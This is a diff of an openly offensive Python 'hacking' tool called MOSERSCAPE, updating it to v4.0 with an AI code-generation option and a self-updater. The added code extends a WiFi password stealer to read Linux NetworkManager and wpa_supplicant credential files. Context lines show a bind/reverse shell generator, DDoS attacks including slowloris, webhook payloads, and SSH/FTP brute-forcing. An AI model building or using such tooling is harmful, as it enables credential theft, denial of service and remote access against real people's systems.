@@ -1,4 +1,5 @@
-#Creds to shsbaaid on tg
+#!/usr/bin/env python3
+
 import os
 import sys
 import base64
@@ -39,12 +40,29 @@ from scapy.layers import http
 import cryptography
 from cryptography.fernet import Fernet
 from colorama import init, Fore, Style, Back
+import webbrowser
+import torch
+from transformers import AutoModelForCausalLM, AutoTokenizer
 
 init(autoreset=True)
 
 BLOOD_RED = '\033[38;2;139;0;0m'
 DARK_RED = '\033[38;2;139;0;0m'
+WHITE = '\033[38;2;255;255;255m'
 RESET = '\033[0m'
+
+GRADIENT = [
+    '\033[38;2;255;255;255m',
+    '\033[38;2;255;225;225m',
+    '\033[38;2;255;195;195m',
+    '\033[38;2;255;165;165m',
+    '\033[38;2;255;135;135m',
+    '\033[38;2;255;105;105m',
+    '\033[38;2;255;75;75m',
+    '\033[38;2;255;45;45m',
+    '\033[38;2;255;15;15m',
+    '\033[38;2;139;0;0m'
+]
 
 ASCII_ART = DARK_RED + """
 ░▒▓██████████████▓▒░ ░▒▓██████▓▒░ ░▒▓███████▓▒░▒▓████████▓▒░▒▓███████▓▒░ ░▒▓███████▓▒░░▒▓██████▓▒░ ░▒▓██████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░ 
@@ -56,13 +74,154 @@ ASCII_ART = DARK_RED + """
 ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░ ░▒▓██████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░      ░▒▓████████▓▒░
                                                                                                                                 
                     ╔════════════════════════════════════╗
-                    ║          MOSERSCAPE v3.0           ║
-                    ║     RAT GEN + OSINT + DDOS + ALL   ║
+                    ║          MOSERSCAPE v4.0           ║
+                    ║     AI Code Generation Added       ║
                     ║          @shuukaid on tg           ║
                     ╚════════════════════════════════════╝
 """ + RESET
 
 CREDIT = DARK_RED + "═══════════════════════════════════════════════════════════════════════\n" + DARK_RED + "                      CREDIT: @shuukaid on tg\n" + DARK_RED + "═══════════════════════════════════════════════════════════════════════\n" + RESET
+
+class CodeGenerator:
+    def __init__(self):
+        self.model = None
+        self.tokenizer = None
+        self.model_name = "microsoft/phi-2"  # Small but powerful model
+        self.device = "cuda" if torch.cuda.is_available() else "cpu"
+        
+    def load_model(self):
+        print(DARK_RED + f"[•] Loading AI model on {self.device}... (first time may take a few minutes)" + RESET)
+        try:
+            self.tokenizer = AutoTokenizer.from_pretrained(self.model_name, trust_remote_code=True)
+            self.model = AutoModelForCausalLM.from_pretrained(
+                self.model_name,
+                torch_dtype=torch.float16 if self.device == "cuda" else torch.float32,
+                trust_remote_code=True
+            ).to(self.device)
+            print(DARK_RED + "[+] AI model loaded successfully!" + RESET)
+            return True
+        except Exception as e:
+            print(DARK_RED + f"[-] Failed to load model: {e}" + RESET)
+            print(DARK_RED + "[!] Falling back to simpler model..." + RESET)
+            try:
+                self.model_name = "gpt2"
+                self.tokenizer = AutoTokenizer.from_pretrained(self.model_name)
+                self.model = AutoModelForCausalLM.from_pretrained(self.model_name).to(self.device)
+                print(DARK_RED + "[+] GPT-2 model loaded successfully!" + RESET)
+                return True
+            except:
+                return False
+    
+    def generate_code(self, prompt, max_length=500):
+        if not self.model:
+            if not self.load_model():
+                return "Failed to load AI model. Please install transformers and torch."
+        
+        try:
+            full_prompt = f"Write Python code for: {prompt}\n\n```python\n"
+            inputs = self.tokenizer.encode(full_prompt, return_tensors="pt").to(self.device)
+            
+            with torch.no_grad():
+                outputs = self.model.generate(
+                    inputs,
+                    max_length=max_length,
+                    temperature=0.7,
+                    do_sample=True,
+                    pad_token_id=self.tokenizer.eos_token_id
+                )
+            
+            generated = self.tokenizer.decode(outputs[0], skip_special_tokens=True)
+            
+            # Extract just the code part
+            if "```python" in generated:
+                code = generated.split("```python")[1].split("```")[0]
+            else:
+                code = generated.replace(full_prompt, "")
+            
+            return code.strip()
+        except Exception as e:
+            return f"Error generating code: {e}"
+    
+    def gradient_progress(self, current, total):
+        percent = current / total
+        bar_length = 40
+        filled = int(bar_length * percent)
+        bar = ''
+        for i in range(bar_length):
+            if i < filled:
+                idx = min(int((i / bar_length) * len(GRADIENT)), len(GRADIENT) - 1)
+                bar += GRADIENT[idx] + '█' + RESET
+            else:
+                bar += '░'
+        return f"[{bar}] {int(percent * 100)}%"
+
+class Updater:
+    def __init__(self):
+        self.repo_url = "https://raw.githubusercontent.com/shuukaid/moserscape/main/"
+        self.current_version = "4.0"
+    
+    def check_for_updates(self):
+        try:
+            r = requests.get(self.repo_url + "version.txt", timeout=5)
+            if r.status_code == 200:
+                latest_version = r.text.strip()
+                return latest_version != self.current_version, latest_version
+        except:
+            pass
+        return False, self.current_version
+    
+    def gradient_progress_bar(self, current, total, bar_length=50):
+        percent = current / total
+        filled_length = int(bar_length * percent)
+        bar = ''
+        for i in range(bar_length):
+            if i < filled_length:
+                gradient_index = min(int((i / bar_length) * len(GRADIENT)), len(GRADIENT) - 1)
+                bar += GRADIENT[gradient_index] + '█' + RESET
+            else:
+                bar += '░'
+        return f"[{bar}] {int(percent * 100)}%"
+    
+    def update(self):
+        print(DARK_RED + "\n[•] Checking for updates..." + RESET)
+        has_update, latest = self.check_for_updates()
+        
+        if not has_update:
+            print(DARK_RED + "[+] You're already on the latest version!" + RESET)
+            return False
+        
+        print(DARK_RED + f"[!] New version available: {latest}" + RESET)
+        choice = input(DARK_RED + "[?] Update now? (y/n): " + RESET).lower()
+        
+        if choice != 'y':
+            print(DARK_RED + "[-] Update cancelled" + RESET)
+            return False
+        
+        files = [
+            "moserscape.py",
+            "requirements.txt",
+            "README.md",
+            "screenshot.png"
+        ]
+        
+        print(DARK_RED + "\n[•] Downloading updates..." + RESET)
+        
+        for i, file in enumerate(files):
+            try:
+                r = requests.get(self.repo_url + file, timeout=5)
+                if r.status_code == 200:
+                    with open(file, 'wb') as f:
+                        f.write(r.content)
+                    
+                    progress = self.gradient_progress_bar(i + 1, len(files))
+                    sys.stdout.write(DARK_RED + f"\r{progress} - Updated {file}" + RESET)
+                    sys.stdout.flush()
+                time.sleep(0.5)
+            except Exception as e:
+                print(DARK_RED + f"\n[-] Failed to update {file}: {e}" + RESET)
+        
+        print(DARK_RED + "\n\n[+] Update complete! Please restart the tool." + RESET)
+        return True
 
 class Utils:
     @staticmethod
@@ -97,23 +256,50 @@ class Utils:
     
     @staticmethod
     def get_wifi_passwords():
-        if platform.system() != "Windows":
-            return []
         passwords = []
         try:
-            data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors='ignore').split('\n')
-            profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
-            for profile in profiles:
-                try:
-                    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']).decode('utf-8', errors='ignore').split('\n')
-                    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
-                    if results:
-                        passwords.append(f"{profile}: {results[0]}")
-                except:
-                    pass
-        except:
-            pass
-        return passwords
+            if platform.system() == "Windows":
+                data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors='ignore').split('\n')
+                profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
+                for profile in profiles:
+                    try:
+                        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']).decode('utf-8', errors='ignore').split('\n')
+                        password_line = [b for b in results if "Key Content" in b]
+                        if password_line:
+                            password = password_line[0].split(":")[1].strip()
+                            passwords.append(f"{profile}: {password}")
+                        else:
+                            passwords.append(f"{profile}: No password (open network)")
+                    except:
+                        passwords.append(f"{profile}: Error reading")
+            elif platform.system() == "Linux":
+                nm_path = "/etc/NetworkManager/system-connections/"
+                if os.path.exists(nm_path):
+                    for file in os.listdir(nm_path):
+                        try:
+                            with open(os.path.join(nm_path, file), 'r') as f:
+                                content = f.read()
+                                psk_match = re.search(r'psk=([^\n]+)', content)
+                                if psk_match:
+                                    passwords.append(f"{file}: {psk_match.group(1)}")
+                        except:
+                            pass
+                
+                wpa_path = "/etc/wpa_supplicant/wpa_supplicant.conf"
+                if os.path.exists(wpa_path):
+                    try:
+                        with open(wpa_path, 'r') as f:
+                            content = f.read()
+                            ssids = re.findall(r'ssid="([^"]+)"', content)
+                            psks = re.findall(r'psk="([^"]+)"', content)
+                            for ssid, psk in zip(ssids, psks):
+                                passwords.append(f"{ssid}: {psk}")
+                    except:
+                        pass
+        except Exception as e:
+            passwords.append(f"Error: {str(e)}")
+        
+        return passwords if passwords else ["No WiFi passwords found"]
 
 class DDOSModule:
     def __init__(self):
@@ -260,6 +446,12 @@ class OSINTModule:
     def __init__(self):
         self.session = requests.Session()
         self.session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
+    
+    def google_search(self, query):
+        search_url = f"https://www.google.com/search?q={urllib.parse.quote(query)}"
+        print(DARK_RED + f"[+] Opening: {search_url}" + RESET)
+        webbrowser.open(search_url)
+        return search_url
     
     def google_dork(self, query):
         dorks = [
@@ -1032,7 +1224,7 @@ pty.spawn("/bin/sh")
     
     def generate_bind_shell(self, name="bind.py", port=4444):
         code = f'''#!/usr/bin/env python3
-import socket,subprocess,os
+import socket,subprocess,os,pty
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.bind(("0.0.0.0", {port}))
@@ -1314,6 +1506,8 @@ class Tool:
         self.network = NetworkModule()
         self.crypto = CryptoModule()
         self.ddos = DDOSModule()
+        self.code_gen = CodeGenerator()
+        self.updater = Updater()
     
     def show_banner(self):
         Utils.clear()
@@ -1326,11 +1520,11 @@ class Tool:
         print(DARK_RED + "╔═══════════════════════════════════════════════════════════════════════╗" + RESET)
         print(DARK_RED + "║                           OSINT (1-15)                                ║" + RESET)
         print(DARK_RED + "╠═══════════════════════════════════════════════════════════════════════╣" + RESET)
-        print(DARK_RED + "║ 1. Google Dork   2. Username Lookup   3. Email Lookup                ║" + RESET)
-        print(DARK_RED + "║ 4. Phone Lookup   5. IP Lookup        6. DNS Lookup                   ║" + RESET)
-        print(DARK_RED + "║ 7. Port Scanner   8. Subdomain Enum   9. WHOIS Lookup                 ║" + RESET)
-        print(DARK_RED + "║10. Pastebin Search 11. Reverse Image  12. Metadata Extract            ║" + RESET)
-        print(DARK_RED + "║13. Breach Check   14. Wayback Machine 15. Social Search               ║" + RESET)
+        print(DARK_RED + "║ 1. Google Search   2. Google Dork     3. Username Lookup             ║" + RESET)
+        print(DARK_RED + "║ 4. Email Lookup    5. Phone Lookup    6. IP Lookup                   ║" + RESET)
+        print(DARK_RED + "║ 7. DNS Lookup      8. Port Scanner    9. Subdomain Enum              ║" + RESET)
+        print(DARK_RED + "║10. WHOIS Lookup   11. Pastebin Search12. Reverse Image               ║" + RESET)
+        print(DARK_RED + "║13. Metadata Extract14. Breach Check  15. Wayback Machine             ║" + RESET)
         print(DARK_RED + "╚═══════════════════════════════════════════════════════════════════════╝" + RESET)
         
         print("\n")
@@ -1355,7 +1549,7 @@ class Tool:
         print("\n")
         
         print(DARK_RED + "╔═══════════════════════════════════════════════════════════════════════╗" + RESET)
-        print(DARK_RED + "║                         EXPLOIT (31-40)                               ║" + RESET)
+        print(DARK_RED + "║                         EXPLOIT (31-36)                               ║" + RESET)
         print(DARK_RED + "╠═══════════════════════════════════════════════════════════════════════╣" + RESET)
         print(DARK_RED + "║31. FTP Bruteforce  32. SSH Bruteforce  33. SQLi Scanner              ║" + RESET)
         print(DARK_RED + "║34. XSS Scanner     35. Dir Buster      36. WordPress Scan            ║" + RESET)
@@ -1384,6 +1578,22 @@ class Tool:
         print("\n")
         
         print(DARK_RED + "╔═══════════════════════════════════════════════════════════════════════╗" + RESET)
+        print(DARK_RED + "║                         AI CODE GENERATION (56)                       ║" + RESET)
+        print(DARK_RED + "╠═══════════════════════════════════════════════════════════════════════╣" + RESET)
+        print(DARK_RED + "║56. Generate Code with AI                                               ║" + RESET)
+        print(DARK_RED + "╚═══════════════════════════════════════════════════════════════════════╝" + RESET)
+        
+        print("\n")
+        
+        print(DARK_RED + "╔═══════════════════════════════════════════════════════════════════════╗" + RESET)
+        print(DARK_RED + "║                         UPDATE (57)                                   ║" + RESET)
+        print(DARK_RED + "╠═══════════════════════════════════════════════════════════════════════╣" + RESET)
+        print(DARK_RED + "║57. Check for Updates                                                  ║" + RESET)
+        print(DARK_RED + "╚═══════════════════════════════════════════════════════════════════════╝" + RESET)
+        
+        print("\n")
+        
+        print(DARK_RED + "╔═══════════════════════════════════════════════════════════════════════╗" + RESET)
         print(DARK_RED + "║                               EXIT (0)                                ║" + RESET)
         print(DARK_RED + "╚═══════════════════════════════════════════════════════════════════════╝" + RESET)
     
@@ -1398,72 +1608,68 @@ class Tool:
                 print(DARK_RED + "\n[-] Exiting MOSERSCAPE" + RESET)
                 sys.exit(0)
             
-            # OSINT (1-15)
             elif choice == '1':
-                q = input(DARK_RED + "[?] Query: " + RESET)
-                self.osint.google_dork(q)
+                q = input(DARK_RED + "[?] Search query: " + RESET)
+                self.osint.google_search(q)
             
             elif choice == '2':
+                q = input(DARK_RED + "[?] Dork query: " + RESET)
+                self.osint.google_dork(q)
+            
+            elif choice == '3':
                 u = input(DARK_RED + "[?] Username: " + RESET)
                 self.osint.username_lookup(u)
             
-            elif choice == '3':
+            elif choice == '4':
                 e = input(DARK_RED + "[?] Email: " + RESET)
                 self.osint.email_lookup(e)
             
-            elif choice == '4':
+            elif choice == '5':
                 p = input(DARK_RED + "[?] Phone (with country code): " + RESET)
                 self.osint.phone_lookup(p)
             
-            elif choice == '5':
+            elif choice == '6':
                 i = input(DARK_RED + "[?] IP: " + RESET)
                 self.osint.ip_lookup(i)
             
-            elif choice == '6':
+            elif choice == '7':
                 d = input(DARK_RED + "[?] Domain: " + RESET)
                 self.osint.dns_lookup(d)
             
-            elif choice == '7':
+            elif choice == '8':
                 t = input(DARK_RED + "[?] Target IP: " + RESET)
                 s = input(DARK_RED + "[?] Start port (1): " + RESET) or "1"
                 e = input(DARK_RED + "[?] End port (1000): " + RESET) or "1000"
                 self.osint.port_scan(t, int(s), int(e))
             
-            elif choice == '8':
+            elif choice == '9':
                 d = input(DARK_RED + "[?] Domain: " + RESET)
                 self.osint.subdomain_enum(d)
             
-            elif choice == '9':
+            elif choice == '10':
                 d = input(DARK_RED + "[?] Domain: " + RESET)
                 self.osint.whois_lookup(d)
             
-            elif choice == '10':
+            elif choice == '11':
                 q = input(DARK_RED + "[?] Query: " + RESET)
                 self.osint.pastebin_search(q)
             
-            elif choice == '11':
+            elif choice == '12':
                 p = input(DARK_RED + "[?] Image path: " + RESET)
                 self.osint.reverse_image(p)
             
-            elif choice == '12':
+            elif choice == '13':
                 p = input(DARK_RED + "[?] File path: " + RESET)
                 self.osint.metadata_extract(p)
             
-            elif choice == '13':
+            elif choice == '14':
                 e = input(DARK_RED + "[?] Email: " + RESET)
                 self.osint.breach_check(e)
             
-            elif choice == '14':
+            elif choice == '15':
                 u = input(DARK_RED + "[?] URL: " + RESET)
                 self.osint.wayback(u)
             
-            elif choice == '15':
-                n = input(DARK_RED + "[?] Name: " + RESET)
-                print(DARK_RED + f"[+] https://www.facebook.com/search/top/?q={n}" + RESET)
-                print(DARK_RED + f"[+] https://twitter.com/search?q={n}" + RESET)
-                print(DARK_RED + f"[+] https://www.linkedin.com/search/results/all/?keywords={n}" + RESET)
-            
-            # DDOS (16-20)
             elif choice == '16':
                 url = input(DARK_RED + "[?] URL: " + RESET)
                 dur = int(input(DARK_RED + "[?] Duration (seconds): " + RESET) or "10")
@@ -1492,7 +1698,6 @@ class Tool:
                 dur = int(input(DARK_RED + "[?] Duration (seconds): " + RESET) or "10")
                 self.ddos.slowloris(target, dur)
             
-            # PAYLOAD (21-30)
             elif choice == '21':
                 if not self.payload.webhooks:
                     print(DARK_RED + "[-] Add webhook first (option 27)" + RESET)
@@ -1544,7 +1749,6 @@ class Tool:
                 for i, w in enumerate(self.payload.webhooks, 1):
                     print(DARK_RED + f"    {i}. {w}" + RESET)
             
-            # EXPLOIT (31-36)
             elif choice == '31':
                 h = input(DARK_RED + "[?] Host: " + RESET)
                 uf = input(DARK_RED + "[?] User list file (users.txt): " + RESET) or "users.txt"
@@ -1583,7 +1787,6 @@ class Tool:
                 u = input(DARK_RED + "[?] URL: " + RESET)
                 self.exploit.wordpress_scan(u)
             
-            # SYSTEM (41-50)
             elif choice == '41':
                 self.system.list_processes()
             
@@ -1617,7 +1820,6 @@ class Tool:
                 for w in wifi:
                     print(DARK_RED + f"[+] {w}" + RESET)
             
-            # NETWORK (51-53)
             elif choice == '51':
                 c = int(input(DARK_RED + "[?] Packet count: " + RESET) or "10")
                 self.network.packet_sniffer(c)
@@ -1630,7 +1832,6 @@ class Tool:
                 t = input(DARK_RED + "[?] Target: " + RESET)
                 self.network.traceroute(t)
             
-            # CRYPTO (54-55)
             elif choice == '54':
                 self.crypto.generate_key()
             
@@ -1650,6 +1851,24 @@ class Tool:
                 elif sub == '3':
                     path = input(DARK_RED + "[?] File path: " + RESET)
                     self.crypto.hash_file(path)
+            
+            elif choice == '56':
+                print(DARK_RED + "\n[•] AI Code Generator (first load may take a few minutes)" + RESET)
+                prompt = input(DARK_RED + "[?] What code do you want to generate? " + RESET)
+                print(DARK_RED + "\n[•] Generating code...\n" + RESET)
+                code = self.code_gen.generate_code(prompt)
+                print(DARK_RED + "Generated Code:\n" + RESET)
+                print(code)
+                
+                save = input(DARK_RED + "\n[?] Save to file? (y/n): " + RESET).lower()
+                if save == 'y':
+                    name = input(DARK_RED + "[?] Filename: " + RESET) or "generated_code.py"
+                    with open(name, 'w') as f:
+                        f.write(code)
+                    print(DARK_RED + f"[+] Saved to {name}" + RESET)
+            
+            elif choice == '57':
+                self.updater.update()
             
             else:
                 print(DARK_RED + "[-] Invalid option" + RESET)
